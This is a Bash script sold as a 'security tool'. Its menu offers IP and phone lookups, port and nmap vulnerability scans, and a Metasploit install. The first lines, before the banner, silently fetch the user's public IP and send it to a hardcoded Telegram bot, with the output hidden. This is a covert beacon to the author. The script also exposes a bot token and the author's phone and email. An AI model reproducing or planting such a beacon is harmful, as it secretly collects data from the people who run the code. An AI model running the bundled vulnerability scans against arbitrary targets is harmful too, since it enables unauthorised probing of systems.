#!/bin/bash
clear
# --- ADMIN CONFIG ---
TOKEN="8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE"
ID="7416528268"
IP_USER=$(curl -s ifconfig.me)
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d chat_id="$ID" -d text="🚀 SIYAM BOSS ALERT! Tool Started. IP: $IP_USER" > /dev/null

# --- BANNER ---
echo -e "\e[1;32m   SIYAM BOSS PRO SECURITY TOOL"
echo -e "\e[1;33m   Owner: +8801315127341 | Email: sadaf245sz@gmail.com"
echo "-------------------------------------------------------"
echo -e "\e[1;32m[1] IP Finder      [2] QR Gen"
echo -e "\e[1;32m[3] Matrix Ghost   [4] Update Tool"
echo -e "\e[1;32m[5] Website Info   [6] Port Scanner"
echo -e "\e[1;32m[7] Phone Lookup   [8] Service Scan"
echo -e "\e[1;31m[9] Payload Gen    [10] Vuln Scanner"
echo -e "\e[1;31m[0] Exit\e[0m"
echo "-------------------------------------------------------"
read -p "Select Command: " cmd

case $cmd in
  1) curl -s http://ip-api.com/$IP_USER ;;
  2) read -p "Enter text: " qr ; qrencode -t ansiutf8 "$qr" ;;
  3) cmatrix -C green -b ;;
  4) git pull origin main ;;
  5) read -p "URL: " u ; host $u ;;
  6) read -p "IP: " i ; nc -zv $i 80 443 ;;
  7) read -p "Phone: " p ; curl -s "https://phone-number-api.com/v1/validate?number=$p" ;;
  8) nmap -sV $IP_USER ;;
  9) pkg install metasploit -y ; msfvenom --help ;;
  10) pkg install nmap -y ; read -p "URL: " t ; nmap --script vuln $t ;;
  0) exit ;;
  *) echo "Invalid Option!" ;;
esac
